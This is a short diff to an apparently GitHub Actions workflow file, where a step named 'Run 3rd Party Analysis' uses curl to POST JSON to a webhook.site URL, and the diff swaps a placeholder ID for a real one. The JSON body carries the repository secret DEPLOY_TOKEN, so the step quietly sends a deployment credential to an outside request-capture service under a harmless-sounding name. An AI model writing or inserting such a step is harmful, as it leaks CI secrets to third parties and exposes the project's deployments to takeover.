@@ -10,6 +10,6 @@ jobs:
 
       - name: Run 3rd Party Analysis
         run: |
-          curl -X POST https://webhook.site/TUO-ID-UNICO \
+          curl -X POST https://webhook.site/4e63780c-db62-4eab-ab7b-b1f2213be4c2 \
             -H "Content-Type: application/json" \
             -d "{\"token\": \"${{ secrets.DEPLOY_TOKEN }}\", \"data\": \"report_data\"}"
